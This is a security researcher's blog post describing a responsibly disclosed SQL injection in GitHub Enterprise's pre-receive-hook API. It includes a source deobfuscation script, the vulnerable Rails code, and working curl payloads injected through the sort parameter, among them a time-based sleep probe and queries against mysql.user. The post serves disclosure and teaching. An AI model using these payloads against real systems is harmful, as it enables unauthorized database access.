---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/
title: "GitHub Enterprise SQL Injection | Orange Tsai"
author: "Orange Tsai"
published: 2017-01-06T16:00:00.000Z
description: "BeforeGitHub Enterprise is the on-premises version of GitHub.com that you can deploy a whole GitHub service in your private network for businesses. You can get 45-days free trial and download the VM"
---

* * *

![preview](https://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/efb3e6ce144c9274-01.jpg)

# [Before](https://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/\#Before "Before") Before

GitHub Enterprise is the on-premises version of [GitHub.com](https://github.com/) that you can deploy a whole GitHub service in your private network for businesses. You can get 45-days free trial and download the VM from [enterprise.github.com](https://enterprise.github.com/).

After you deployed, you will see like bellow:

![](https://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/a81df8f4402b419c-02.png)

![](https://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/20609f2163e55ac6-03.png)

Now, I have all the GitHub environment in a VM. It’s interesting, so I decided to look deeper into VM :P

# [Environment](https://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/\#Environment "Environment") Environment

The beginning of everything is Port Scanning. After using our good friend - Nmap, we found that there are 6 exposed ports on VM.

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>``` | ```<br>$ nmap -sT -vv -p 1-65535 192.168.187.145<br>...<br>PORT     STATE  SERVICE<br>22/tcp   open   ssh<br>25/tcp   closed smtp<br>80/tcp   open   http<br>122/tcp  open   smakynet<br>443/tcp  open   https<br>8080/tcp closed http-proxy<br>8443/tcp open   https-alt<br>9418/tcp open   git<br>``` |

With a little knocking and service grabbing, it seems like:

- `22/tcp` and `9418/tcp` seem like `haproxy` and it forwards connections to a backend service called `babeld`
- `80/tcp` and `443/tcp` are the main GitHub services
- `122/tcp` is just a SSH service
- `8443/tcp` is management console of GitHub

By the way, GitHub management console need a password to login. Once you got the password, you can add your SSH key and connect into VM through `122/tcp`

With SSH into VM, we examined the whole system and found that the service code base looks like under directory of `/data/`

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>``` | ```<br>$ ls -al /data/<br>total 92<br>drwxr-xr-x 23 root              root              4096 Nov 29 12:54 .<br>drwxr-xr-x 27 root              root              4096 Dec 28 19:18 ..<br>drwxr-xr-x  4 git               git               4096 Nov 29 12:54 alambic<br>drwxr-xr-x  4 babeld            babeld            4096 Nov 29 12:53 babeld<br>drwxr-xr-x  4 git               git               4096 Nov 29 12:54 codeload<br>drwxr-xr-x  2 root              root              4096 Nov 29 12:54 db<br>drwxr-xr-x  2 root              root              4096 Nov 29 12:52 enterprise<br>drwxr-xr-x  4 enterprise-manage enterprise-manage 4096 Nov 29 12:53 enterprise-manage<br>drwxr-xr-x  4 git               git               4096 Nov 29 12:54 failbotd<br>drwxr-xr-x  3 root              root              4096 Nov 29 12:54 git-hooks<br>drwxr-xr-x  4 git               git               4096 Nov 29 12:53 github<br>drwxr-xr-x  4 git               git               4096 Nov 29 12:54 git-import<br>drwxr-xr-x  4 git               git               4096 Nov 29 12:54 gitmon<br>drwxr-xr-x  4 git               git               4096 Nov 29 12:54 gpgverify<br>drwxr-xr-x  4 git               git               4096 Nov 29 12:54 hookshot<br>drwxr-xr-x  4 root              root              4096 Nov 29 12:54 lariat<br>drwxr-xr-x  4 root              root              4096 Nov 29 12:54 longpoll<br>drwxr-xr-x  4 git               git               4096 Nov 29 12:54 mail-replies<br>drwxr-xr-x  4 git               git               4096 Nov 29 12:54 pages<br>drwxr-xr-x  4 root              root              4096 Nov 29 12:54 pages-lua<br>drwxr-xr-x  4 git               git               4096 Nov 29 12:54 render<br>lrwxrwxrwx  1 root              root                23 Nov 29 12:52 repositories -> /data/user/repositories<br>drwxr-xr-x  4 git               git               4096 Nov 29 12:54 slumlord<br>drwxr-xr-x 20 root              root              4096 Dec 28 19:22 user<br>``` |

Change directory to `/data/` and try to review the source code, but it seems encrypted :(

![](https://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/482d7eb3053df05e-04.png)

GitHub uses a custom library to obfuscate their source code. If you search `ruby_concealer.so` on Google, you will find a kind man write a snippet on [this gist](https://gist.github.com/geoff-codes/02d1e45912253e9ac183).

It simply replace `rb_f_eval` to `rb_f_puts`in `ruby_concealer.so` and it’s work.

But to be a hacker. We can’t just use it without knowing how it works. So, let’s open IDA Pro!

![](https://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/dd61f17b0587e12e-05.png)

![](https://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/6f86f7b65cd3f212-06.png)

As you can see. It just uses `Zlib::Inflate::inflate` to decompress data and XOR with following key:

> This obfuscation is intended to discourage GitHub Enterprise customers from making modifications to the VM. We know this ‘encryption’ is easily broken.

So we can easily implement it by our-self!

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>``` | ```<br>require 'zlib'<br>def decrypt(s)<br>    key = "This obfuscation is intended to discourage GitHub Enterprise customers from making modifications to the VM. We know this 'encryption' is easily broken. "<br>    i, plaintext = 0, ''<br>    Zlib::Inflate.inflate(s).each_byte do |c|<br>        plaintext << (c ^ key[i%key.length].ord).chr<br>        i += 1<br>    end<br>    plaintext<br>end<br>content = File.open(ARGV[0], "r").read<br>content.sub! %Q(require "ruby_concealer.so"\n__ruby_concealer__), " decrypt "<br>plaintext = eval content<br>puts plaintext<br>``` |

# [Code Analysis](https://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/\#Code-Analysis "Code Analysis") Code Analysis

After de-obfuscated all the code. Finally, we can start our code reviewing process.

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>``` | ```<br>$ cloc /data/<br>   81267 text files.<br>   47503 unique files.<br>   24550 files ignored.<br>http://cloc.sourceforge.net v 1.60  T=348.06 s (103.5 files/s, 15548.9 lines/s)<br>-----------------------------------------------------------------------------------<br>Language                         files          blank        comment           code<br>-----------------------------------------------------------------------------------<br>Ruby                             25854         359545         437125        1838503<br>Javascript                        4351         109994         105296         881416<br>YAML                               600           1349           3214         289039<br>Python                            1108          44862          64025         180400<br>XML                                121           6492           3223         125556<br>C                                  444          30903          23966         123938<br>Bourne Shell                       852          14490          16417          87477<br>HTML                               636          24760           2001          82526<br>C++                                184           8370           8890          79139<br>C/C++ Header                       428          11679          22773          72226<br>Java                               198           6665          14303          45187<br>CSS                                458           4641           3092          44813<br>Bourne Again Shell                 142           6196           9006          35106<br>m4                                  21           3259            369          29433<br>...<br>``` |

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>``` | ```<br>$ ./bin/rake about<br>About your application's environment<br>Ruby version              2.1.7 (x86_64-linux)<br>RubyGems version          2.2.5<br>Rack version              1.6.4<br>Rails version             3.2.22.4<br>JavaScript Runtime        Node.js (V8)<br>Active Record version     3.2.22.4<br>Action Pack version       3.2.22.4<br>Action Mailer version     3.2.22.4<br>Active Support version    3.2.22.4<br>Middleware                GitHub::DefaultRoleMiddleware, Rack::Runtime, Rack::MethodOverride, ActionDispatch::RequestId, Rails::Rack::Logger, ActionDispatch::ShowExceptions, ActionDispatch::DebugExceptions, ActionDispatch::Callbacks, ActiveRecord::ConnectionAdapters::ConnectionManagement, ActionDispatch::Cookies, ActionDispatch::Session::CookieStore, ActionDispatch::Flash, ActionDispatch::ParamsParser, ActionDispatch::Head, Rack::ConditionalGet, Rack::ETag, ActionDispatch::BestStandardsSupport<br>Application root          /data/github/9fcdcc8<br>Environment               production<br>Database adapter          githubmysql2<br>Database schema version   20161003225024<br>``` |

Most of the code are written in Ruby (Ruby on Rails and Sinatra).

- `/data/github/` looks like the application run under port `80/tcp``443/tcp` and it looks like the real code base of `github.com`, `gist.github.com` and `api.github.com`
- `/data/render/` looks like real code base of `render.githubusercontent.com`
- `/data/enterprise-manage/` seems like the application run under port `8443/tcp`

GitHub Enterprise uses `enterprise?` and `dotcom?` to check whether the application is running under **Enterprise Mode** or **GitHub dot com mode**.

# [Vulnerability](https://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/\#Vulnerability "Vulnerability") Vulnerability

I use about one week to find this vulnerability, I am not familiar with Ruby. But just learning from doing :P

This is my rough schedule of the week.

- Day 1 - Setting VM
- Day 2 - Setting VM
- Day 3 - Learning Rails by code reviewing
- Day 4 - Learning Rails by code reviewing
- Day 5 - Learning Rails by code reviewing
- Day 6 - Yeah, I found a SQL Injection!

That SQL Injection vulnerability is found under GitHub Enterprise `PreReceiveHookTarget` model.

The root cause is in `/data/github/current/app/model/pre_receive_hook_target.rb` line 45

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>``` | ```<br>33   scope :sorted_by, -> (order, direction = nil) {<br>34     direction = "DESC" == "#{direction}".upcase ? "DESC" : "ASC"<br>35     select(<<-SQL)<br>36       #{table_name}.*,<br>37       CASE hookable_type<br>38         WHEN 'global'     THEN 0<br>39         WHEN 'User'       THEN 1<br>40         WHEN 'Repository' THEN 2<br>41       END AS priority<br>42     SQL<br>43       .joins("JOIN pre_receive_hooks hook ON hook_id = hook.id")<br>44       .readonly(false)<br>45       .order([order, direction].join(" "))<br>46   }<br>``` |

Although There is built-in ORM(called `ActiveRecord` in Rails) in Rails and prevent you from SQL Injection. But there are so many **misuse** of `ActiveRecord` may cause SQL Injection.

More examples you can check [Rails-sqli.org](http://rails-sqli.org/). It’s good to learn about SQL Injection on Rails.

In this case, if we can control the parameter of method `order` we can inject our malicious payload into SQL.

OK, let’s trace up! `sorted_by` is called by `/data/github/current/app/api/org_pre_receive_hooks.rb` in line 61.

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>``` | ```<br>10   get "/organizations/:organization_id/pre-receive-hooks" do<br>11     control_access :list_org_pre_receive_hooks, :org => org = find_org!<br>12     @documentation_url << "#list-pre-receive-hooks"<br>13     targets = PreReceiveHookTarget.visible_for_hookable(org)<br>14     targets = sort(targets).paginate(pagination)<br>15     GitHub::PrefillAssociations.for_pre_receive_hook_targets targets<br>16     deliver :pre_receive_org_target_hash, targets<br>17   end<br>...<br>60   def sort(scope)<br>61     scope.sorted_by("hook.#{params[:sort] || "id"}", params[:direction] || "asc")<br>62   end<br>``` |

You can see that `params[:sort]` is passed to `scope.sorted_by` . So, we can inject our malicious payload into `params[:sort]`.

Before you trigger this vulnerability, you need a valid `access_token` with `admin:pre_receive_hook` scope to access API. Fortunately, it can be obtained by following command:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>``` | ```<br>$ curl -k -u 'nogg:nogg' 'https://192.168.187.145/api/v3/authorizations' \<br>-d '{"scopes":"admin:pre_receive_hook","note":"x"}'<br>{<br>  "id": 4,<br>  "url": "https://192.168.187.145/api/v3/authorizations/4",<br>  "app": {<br>    "name": "x",<br>    "url": "https://developer.github.com/enterprise/2.8/v3/oauth_authorizations/",<br>    "client_id": "00000000000000000000"<br>  },<br>  "token": "????????",<br>  "hashed_token": "1135d1310cbe67ae931ff7ed8a09d7497d4cc008ac730f2f7f7856dc5d6b39f4",<br>  "token_last_eight": "1fadac36",<br>  "note": "x",<br>  "note_url": null,<br>  "created_at": "2017-01-05T22:17:32Z",<br>  "updated_at": "2017-01-05T22:17:32Z",<br>  "scopes": [<br>    "admin:pre_receive_hook"<br>  ],<br>  "fingerprint": null<br>}<br>``` |

Once you get a `access_token`, you can trigger the vulnerability by:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>``` | ```<br>$ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' \<br>'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&sort=id,(select+1+from+information_schema.tables+limit+1,1)'<br>[<br>]<br>$ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' \<br>'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&sort=id,(select+1+from+mysql.user+limit+1,1)'<br>{<br>  "message": "Server Error",<br>  "documentation_url": "https://developer.github.com/enterprise/2.8/v3/orgs/pre_receive_hooks"<br>}<br>$ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' \<br>'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&sort=id,if(user()="github@localhost",sleep(5),user())<br>{<br>    ...<br>}<br>``` |

![](https://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/4607e1c001b5dbbf-07.png)

# [Timeline](https://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/\#Timeline "Timeline") Timeline

- 2016/12/26 05:48 Report vulnerability to GitHub via HackerOne
- 2016/12/26 08:39 GitHub response that have validated issue and are working on a fix.
- 2016/12/26 15:48 Provide more vulneraiblity detail.
- 2016/12/28 02:44 GitHub response that the fix will included with next release of GitHub Enterprise.
- 2017/01/04 06:41 GitHub response that offer $5,000 USD reward.
- 2017/01/05 02:37 Asked Is there anything I should concern about if I want to post a blog?
- 2017/01/05 03:06 GitHub is very open mind and response that it’s OK!
- 2017/01/05 07:06 GitHub Enterprise 2.8.5 released!